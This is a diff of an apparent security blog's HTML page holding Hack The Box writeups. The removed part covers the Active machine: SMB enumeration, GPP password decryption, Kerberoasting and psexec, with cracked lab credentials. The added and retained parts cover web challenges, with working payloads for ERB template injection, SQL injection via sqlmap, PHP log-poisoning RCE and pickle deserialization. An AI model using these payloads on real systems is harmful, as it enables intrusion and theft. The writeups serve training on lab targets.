@@ -101,110 +101,6 @@
 	   
 	<div class="article-header">
 	    
-		<a class="title" href="/2020/02/10/HTB-Active/">HTB Active Writeup</a>  
-	       
-		 
-
-		<div class="meta">
-			<time>Feb 10, 2020</time>			
-		</div>
-	</div>
-
-
-	
-
-    
-	<div class="typo article-excerpt">	
-		 
-			<p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
-<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/old-machine-images/20200210210254278.png" alt="在这里插入图片描述"></p>
-<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><p>这边我用的是我在OSCP时候用的一个脚本工具（懒惰）</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a><br><img src="/images/old-machine-images/202002102107263.png" alt="在这里插入图片描述"></p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./nmapAutomator.sh 10.10.10.100 Full</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>
-
-<p>除了53和445并没有什么特别能交互的端口</p>
-<figure class="highlight less"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="number">7.80</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2020-02-10 18:56 +08</span></span><br><span class="line">Nmap scan report for <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">Host is up (<span class="number">0.23s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp    open  domain        Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39) (Windows Server <span class="number">2008</span> R2 SP1)</span><br><span class="line">| <span class="attribute">dns-nsid</span>: </span><br><span class="line">|_  bind.<span class="attribute">version</span>: Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39)</span><br><span class="line"><span class="number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="attribute">time</span>: <span class="number">2020</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">10</span>:<span class="number">57</span>:<span class="number">27</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds?</span><br><span class="line"><span class="number">464</span>/tcp   open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">3269</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">5722</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">9389</span>/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line"><span class="number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|<span class="attribute">_http-server-header</span>: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line">|<span class="attribute">_http-title</span>: <span class="keyword">Not</span> Found</span><br><span class="line"><span class="number">49152</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49153</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49155</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49157</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">49158</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49169</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49171</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49182</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">Host</span>: DC; <span class="attribute">OS</span>: Windows; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:<span class="attribute">windows_server_2008</span>:<span class="attribute">r2</span>:sp1, <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:windows</span><br><span class="line"></span><br><span class="line">Host script <span class="attribute">results</span>:</span><br><span class="line">|<span class="attribute">_clock-skew</span>: <span class="number">38s</span></span><br><span class="line">| <span class="attribute">smb2-security-mode</span>: </span><br><span class="line">|   <span class="number">2.02</span>: </span><br><span class="line">|_    Message signing enabled <span class="keyword">and</span> required</span><br><span class="line">| <span class="attribute">smb2-time</span>: </span><br><span class="line">|   <span class="attribute">date</span>: <span class="number">2020</span><span class="attribute">-02-10T10</span>:<span class="number">58</span>:<span class="number">25</span></span><br><span class="line">|_  <span class="attribute">start_date</span>: <span class="number">2020</span><span class="attribute">-02-10T08</span>:<span class="number">17</span>:<span class="number">06</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at <span class="attribute">https</span>:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap <span class="attribute">done</span>: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">194.25</span> seconds</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546</span></span><br></pre></td></tr></tbody></table></figure>
-
-<h1 id="一，SMB-ENUMERATION"><a href="#一，SMB-ENUMERATION" class="headerlink" title="一，SMB ENUMERATION"></a>一，SMB ENUMERATION</h1><p>首先 使用smbmap 来确定anonymous用户的权限（如果有写权限可以直接用impacket 来获取shell）</p>
-<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>发现对 <strong>Replication</strong> 文件夹 <strong>READ ONLY</strong>权限<br><img src="/images/old-machine-images/20200210211447140.png" alt="在这里插入图片描述"><br>（这里我本来想使用mount挂载smb, 但失败了。有成功的可以在评论告诉我。）</p>
-<p>使用 smbclient进行连接 <strong>Replication</strong></p>
-<figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>10.10.10.100<span class="symbol">\\</span>Replication</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>
-
-<p>发现两个有意思的文件夹</p>
-<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">31B2F340</span>-<span class="number">016</span>D-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04FB984F9 是Default admin policy</span><br><span class="line"><span class="attribute">6AC1786C</span>-<span class="number">016</span>F-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04fB984F9 是Default domain polices</span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/2020021021181611.png" class="lazyload"><br>如果没记错的话 windows server 2012以下的版本 会把密码储存在GPO。<br>经过一番查找<br><strong>smb: \active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups</strong></p>
-<p>在此目录发现Groups.xml</p>
-<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210212552448.png" class="lazyload"><br>发现帐号和密码哈希值</p>
-<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">帐号：active.htb\SVC_TGS</span><br><span class="line">哈希值：edBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>可以使用kali自带的gpp-decrypt来破解密码</p>
-<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>得到密码 <strong>GPPstillStandingStrong2k18</strong><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210212726788.png" class="lazyload"><br>现在我们有了新的帐号 利用Smbmap确认我们是否有写的权限（拿shell）</p>
-<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span> -u SVC_TGS -p GPPstillStandingStrong2k18</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210213100537.png" class="lazyload"><br>发现能读权限能读到user目录里的文件<br>可以用smbclient 进去拿user.txt</p>
-<h1 id="三，ROOT"><a href="#三，ROOT" class="headerlink" title="三，ROOT"></a>三，ROOT</h1><p>之前看到 端口88 有 kerberos 在运行。尝试利用kerberoasing 攻击</p>
-<p><a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/094369852800.htm">Kerberoasing 攻击</a></p>
-<p>利用 impacket-GetUserSPNs</p>
-<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/impacket-GetUserSPNs -request active.htb/</span>SVC_TGS:GPPstillStandingStrong2k18 -dc-ip <span class="number">10.10</span>.<span class="number">10.100</span> </span><br><span class="line"></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210221812462.png" class="lazyload"><br>得到hash后 利用john the ripper进行破解<br>得到 Administrator密码为 Ticketmaster1968<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/202002102219053.png" class="lazyload"></p>
-<p>取到帐号和密码后 我们可以使用 impacket psexec 进行登录</p>
-<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>python3-impacket<span class="regexp">/examples/</span>psexec.py active.htb/Administrator:Ticketmaster1968@<span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210222712526.png" class="lazyload"></p>
-<p>成功 拿到Administrator</p>
-<br>
-<br>
-<br>
-
-<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
-
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
-			            
-				<a class="link" href="/tags/smb/">smb</a>           
-			
-		
-	</div>
-
-	<div class="article-bottom">
-		<a class="readmore" href="/2020/02/10/HTB-Active/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
 		<a class="title" href="/2020/01/26/HTB-Heist/">HTB Heist Writeup</a>  
 	       
 		 
@@ -221,10 +117,10 @@
 	<div class="typo article-excerpt">	
 		 
 			<h1 id="No-4-Heist-难度简单-HTB-walkthrough"><a href="#No-4-Heist-难度简单-HTB-walkthrough" class="headerlink" title="No.4-Heist-难度简单-HTB-walkthrough"></a>No.4-Heist-难度简单-HTB-walkthrough</h1><p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
-<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126112412354.png" class="lazyload"></p>
+<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/old-machine-images/20200126112412354.png" alt="在这里插入图片描述"></p>
 <h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sV -sC heist.htb</span><br><span class="line">1</span><br><span class="line">Nmap scan report <span class="keyword">for</span> heist.htb (10.10.10.149)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php                                                                                                                                                                                                         </span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                          </span><br><span class="line">445/tcp open  microsoft-ds?                                                                                                                                                                                                                </span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                                   </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Host script results:                                                                                                                                                                                                                       </span><br><span class="line">|_clock-skew: 4s                                                                                                                                                                                                                           </span><br><span class="line">| smb2-security-mode:                                                                                                                                                                                                                      </span><br><span class="line">|   2.02:                                                                                                                                                                                                                                  </span><br><span class="line">|_    Message signing enabled but not required                                                                                                                                                                                             </span><br><span class="line">| smb2-time:                                                                                                                                                                                                                               </span><br><span class="line">|   <span class="built_in">date</span>: 2020-01-25T01:23:05                                                                                                                                                                                                              </span><br><span class="line">|_  start_date: N/A                                                                                                                                                                                                                        </span><br><span class="line">1234567891011121314151617181920212223242526</span><br></pre></td></tr></tbody></table></figure>
 
-<h1 id="二，HTTP-Enumeration"><a href="#二，HTTP-Enumeration" class="headerlink" title="二，HTTP Enumeration"></a>二，HTTP Enumeration</h1><p>进入web, 是个登陆页面。 并没有找到CMS, 右下角有个 <strong>Login as guest</strong><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126114331293.png" class="lazyload"><br>发现这是个 类似于 <strong>Support desk</strong> 的平台。<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126113042235.png" class="lazyload"><br>点击 Attachment 跳转到 config.txt</p>
+<h1 id="二，HTTP-Enumeration"><a href="#二，HTTP-Enumeration" class="headerlink" title="二，HTTP Enumeration"></a>二，HTTP Enumeration</h1><p>进入web, 是个登陆页面。 并没有找到CMS, 右下角有个 <strong>Login as guest</strong><br><img src="/images/old-machine-images/20200126114331293.png" alt="在这里插入图片描述"><br>发现这是个 类似于 <strong>Support desk</strong> 的平台。<br><img src="/images/old-machine-images/20200126113042235.png" alt="在这里插入图片描述"><br>点击 Attachment 跳转到 config.txt</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0Â mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization <span class="built_in">exec</span> SSH</span><br><span class="line"> transport input ssh</span><br><span class="line">1234567891011121314151617181920212223242526272829303132333435363738394041</span><br></pre></td></tr></tbody></table></figure>
 
 <p>其中有三行是包含哈希值的</p>
@@ -804,6 +700,63 @@
 <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">"http://167.99.85.216:30412/"</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="string">b'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'</span></span><br><span class="line">cookie = base64.b64encode(cookie)</span><br><span class="line">header =  {<span class="string">"PHPSESSID"</span>: cookie.decode()}</span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line">headers = {<span class="string">"User-Agent"</span>: <span class="string">"&lt;?php system('ls -la /')?&gt;"</span>}</span><br><span class="line">r = requests.get(url,cookies=header, headers=headers)</span><br><span class="line">flag = re.search(<span class="string">r'\bflag_\w+\b'</span>, r.text, flags=re.IGNORECASE)</span><br><span class="line">flag = flag.group()</span><br><span class="line"></span><br><span class="line">headers = {<span class="string">"User-Agent"</span>: <span class="string">f"&lt;?php system('cat /<span class="subst">{flag}</span>')?&gt;"</span>}</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">r = requests.get(url,cookies=header, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></tbody></table></figure>
 
 <p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231231210821028.png" class="lazyload"></p>
+<h1 id="Neonify-Easy"><a href="#Neonify-Easy" class="headerlink" title="Neonify - Easy"></a>Neonify - Easy</h1><blockquote>
+<p>It’s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!</p>
+</blockquote>
+<p>In <code>neon.rb</code> file indicate POST method route seems using ERB template engine to render user inputs.</p>
+<figure class="highlight ruby"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NeonControllers</span> &lt; <span class="title class_ inherited__">Sinatra::Base</span></span><br><span class="line"></span><br><span class="line">  configure <span class="keyword">do</span></span><br><span class="line">    set <span class="symbol">:views</span>, <span class="string">"app/views"</span></span><br><span class="line">    set <span class="symbol">:public_dir</span>, <span class="string">"public"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="variable">@neon</span> = <span class="string">"Glow With The Flow"</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> params[<span class="symbol">:neon</span>] =~ <span class="regexp">/^[0-9a-z ]+$/i</span></span><br><span class="line">      <span class="variable">@neon</span> = <span class="variable constant_">ERB</span>.new(params[<span class="symbol">:neon</span>]).result(binding)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="variable">@neon</span> = <span class="string">"Malicious Input Detected"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>The regex match the start and the end of the line, and matches alphanumeric and whitespace only.</p>
+<p>With some research that Ruby regex has some form of <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/577653/difference-between-a-z-and-in-ruby-regular-expressions/577675#577675">insecure use of Regular expressions</a>.</p>
+<p>According to hacktrick we can supply the following payload for reading files</p>
+<figure class="highlight delphi"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%= <span class="keyword">File</span>.open(<span class="string">'/etc/passwd'</span>).<span class="keyword">read</span> %&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>In order to abuse the insecure regex in ruby, burp request seems have problem with the <code>\n</code>.</p>
+<p>We can just firefox to modify the request to manually append a new line just like this in network tab</p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20240101233647948.png" class="lazyload"></p>
+<p>However I did receive a 400 error request.</p>
+<p>After some research, I perform a <a target="_blank" rel="noopener" href="https://meyerweb.com/eric/tools/dencoder/">URL encode</a> seems to get the things right</p>
+<figure class="highlight llvm"><table><tbody><tr><td class="code"><pre><span class="line">neon<span class="operator">=</span>a</span><br><span class="line"><span class="variable">%3</span>C<span class="variable">%25</span><span class="variable">%3</span>D<span class="variable">%20</span>File.open(<span class="variable">%27</span><span class="variable">%2</span>Fetc<span class="variable">%2</span>Fpasswd<span class="variable">%27</span>).read<span class="variable">%20</span><span class="variable">%25</span><span class="variable">%3</span>E</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20240101233841328.png" class="lazyload"></p>
+<p>Yeah, manage to read the file, now we can just change <code>/etc/passwd</code> to <code>/flag.txt</code> and we got the flag.</p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20240101234044647.png" class="lazyload"></p>
+<h1 id="C-O-P-Easy"><a href="#C-O-P-Easy" class="headerlink" title="C.O.P - Easy"></a>C.O.P - Easy</h1><blockquote>
+<p>The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!</p>
+</blockquote>
+<p>Perform a blackbox approach first, found the site shows the ID of the item. </p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20240102214618769.png" class="lazyload"></p>
+<p>Found the item to be listed on the URL </p>
+<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost:<span class="number">1337</span>/view/<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Tried with sqlmap to identify any possible SQLi.</p>
+<p>However there’s some problem with the URL, as it dont have paramter to inject, need to manually added a <code>*</code> in burp request and save it </p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/view/1*</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:1337</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight asciidoc"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -r requests.txt --dump-all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="code">+----+</span>----------------------------------------------------------------------------------</span><br><span class="line"><span class="section">| id | data                                                                                                                                                                                                                                                         | created_at          |</span></span><br><span class="line"><span class="section">+----+----------------------------------------------------------------------------------</span></span><br><span class="line">| 1  | gASVoAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDFBpY2tsZSBTaGlydJSMC2Rlc2NyaXB0aW9ulIwZR2V0IG91ciBuZXcgcGlja2xlIHNoaXJ0IZSMBWltYWdllIwfL3N0YXRpYy9pbWFnZXMvcGlja2xlX3NoaXJ0LmpwZ5SMBXByaWNllIwCMjOUdWIu                         | 2024-01-02 13:44:09 |</span><br><span class="line">| 2  | gASVrAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDlBpY2tsZSBTaGlydCAylIwLZGVzY3JpcHRpb26UjCJHZXQgb3VyIChzZWNvbmQpIG5ldyBwaWNrbGUgc2hpcnQhlIwFaW1hZ2WUjCAvc3RhdGljL2ltYWdlcy9waWNrbGVfc2hpcnQyLmpwZ5SMBXByaWNllIwCMjeUdWIu         | 2024-01-02 13:44:09 |</span><br><span class="line">| 3  | gASVnQAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMD0RpbGwgUGlja2xlIEphcpSMC2Rlc2NyaXB0aW9ulIwXTGl0ZXJhbGx5IGp1c3QgYSBwaWNrbGWUjAVpbWFnZZSMGS9zdGF0aWMvaW1hZ2VzL3BpY2tsZS5qcGeUjAVwcmljZZSMBDEzMzeUdWIu                             | 2024-01-02 13:44:09 |</span><br><span class="line"><span class="section">| 4  | gASVsgAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMD0JyYW5zdG9uIFBpY2tsZZSMC2Rlc2NyaXB0aW9ulIwjRG9lcyB0aGlzIGV2ZW4gZml0IG9uIG91ciBzdG9yZT8hPyGUjAVpbWFnZZSMIi9zdGF0aWMvaW1hZ2VzL2JyYW5zdG9uX3BpY2tsZS5qcGeUjAVwcmljZZSMBDcuMzCUdWIu | 2024-01-02 13:44:09 |</span></span><br><span class="line"><span class="section">+----+----------------------------------------------------------------------------------</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Found some encoded value, decode with base64 seems like some seralization.</p>
+<p>Proceed with source code analysis.</p>
+<figure class="highlight angelscript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">shop</span>(<span class="symbol">object</span>):</span><br><span class="line">    @<span class="symbol">staticmethod</span></span><br><span class="line">    <span class="symbol">def</span> <span class="symbol">select_by_id</span>(<span class="symbol">product_id</span>):</span><br><span class="line">        <span class="symbol">return</span> <span class="symbol">query_db</span>(<span class="symbol">f</span>"<span class="symbol">SELECT</span> <span class="symbol">data</span> <span class="symbol">FROM</span> <span class="symbol">products</span> <span class="symbol">WHERE</span> <span class="symbol">id</span>='{product_id}<span class="string">'", one=True)</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>The parameter does not have any sanitization </p>
+<p>The application seems to serialized the item object and base64 encode and save it in database. </p>
+<figure class="highlight less"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">@app</span>.<span class="built_in">template_filter</span>(<span class="string">'pickle'</span>)</span><br><span class="line">def <span class="built_in">pickle_loads</span>(s):</span><br><span class="line">	return pickle.<span class="built_in">loads</span>(base64.<span class="built_in">b64decode</span>(s))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>In <code>item.html</code> the template engine deserialize the items and render on webpage.</p>
+<figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">{% <span class="keyword">set</span> <span class="built_in">item</span> = product | pickle %}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Since it dont have any restriction, we can passed in a base64 encoded object that trigger a <code>os.system</code> command to achieve RCE.</p>
+<p>In the payload class, we use the <code>__reduce__</code> method to create and return a tuple that includes the operating system command as an argument. Then, from that payload class, we create an object, serialize and encode it. Once again, using Base64, we’ll just need the input from there.</p>
